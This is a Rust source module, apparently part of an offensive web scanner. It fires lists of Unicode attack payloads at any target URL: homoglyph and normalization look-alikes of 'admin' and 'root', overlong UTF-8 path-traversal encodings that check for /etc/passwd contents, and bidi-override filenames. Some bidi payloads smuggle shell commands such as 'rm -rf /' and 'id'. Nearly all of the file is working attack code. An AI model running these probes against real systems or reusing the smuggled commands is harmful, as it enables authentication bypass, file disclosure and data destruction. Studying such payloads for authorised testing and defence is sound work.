use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn homoglyph(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Unicode Homoglyph Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let homoglyphs = [
        ("Cyrillic a", "\u{0430}dmin"),
        ("Cyrillic e", "t\u{0435}st"),
        ("Cyrillic o", "r\u{043e}ot"),
        ("Cyrillic i", "adm\u{0456}n"),
        ("Cyrillic c", "\u{0441}md"),
        ("Fullwidth", "\u{ff41}dmin"),
        ("Math bold", "\u{1d41d}dmin"),
        ("Mixed", "\u{0430}dm\u{0456}n"),
    ];

    for (name, payload) in &homoglyphs {
        let target = format!("{}?user={}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("admin") || text.contains("welcome")) {
                    println!("  {} {:20} — HOMOGLYPH ACCEPTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn overlong(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Overlong UTF-8 Encoding Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let overlong_payloads = [
        ("Overlong / (2-byte)", "%C0%AF"),
        ("Overlong . (2-byte)", "%C0%AE"),
        ("Overlong / (3-byte)", "%E0%80%AF"),
        ("Overlong . (3-byte)", "%E0%80%AE"),
        ("Overlong null", "%C0%80"),
        ("Overlong <", "%C0%BC"),
        ("Overlong >", "%C0%BE"),
        ("Overlong '", "%C0%A7"),
    ];

    for (name, payload) in &overlong_payloads {
        let target = format!("{}?path={}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("root:") || text.contains("etc/")) {
                    println!("  {} {:25} — DECODED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:25} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:25} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn bidi(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Unicode Bidi (Trojan Source) Attack",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let bidi_payloads = [
        ("RLO inject", "admin\u{202E}txt.exe"),
        ("LRO inject", "txt\u{202D}admin.exe"),
        ("RLO + LRO", "\u{202E}admin\u{202C}.txt"),
        ("PDFI", "\u{202E}file.txt\u{202C}.exe"),
        ("RLI", "\u{2067}admin\u{2069}.php"),
        ("FSI", "\u{2068}eval\u{2069}.js"),
        ("PDI", "admin\u{2069}; rm -rf /"),
        ("Mixed bidi", "\u{202E}\u{2066}admin\u{2069}\u{202C};id"),
    ];

    for (name, payload) in &bidi_payloads {
        let target = format!("{}?file={}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!(
                        "  {} {:20} — accepted ({} bytes)",
                        "[!]".red().bold(),
                        name,
                        text.len()
                    );
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn normalize(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Unicode Normalization Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let normalize_payloads = [
        ("NFC admin", "\u{2126}dmin"),
        ("NFD decompose", "a\u{0301}dmin"),
        ("NFKC compat", "\u{FF21}dmin"),
        ("NFKD compat", "A\u{0301}dmin"),
        ("Ligature fi", "\u{FB01}le"),
        ("Ligature fl", "\u{FB02}ag"),
        ("Superscript", "\u{00B2}root"),
        ("Fullwidth dot", "\u{FF0E}env"),
    ];

    for (name, payload) in &normalize_payloads {
        let target = format!("{}?user={}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200
                    && (text.contains("admin") || text.contains("root") || text.contains("welcome"))
                {
                    println!("  {} {:20} — NORMALIZED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
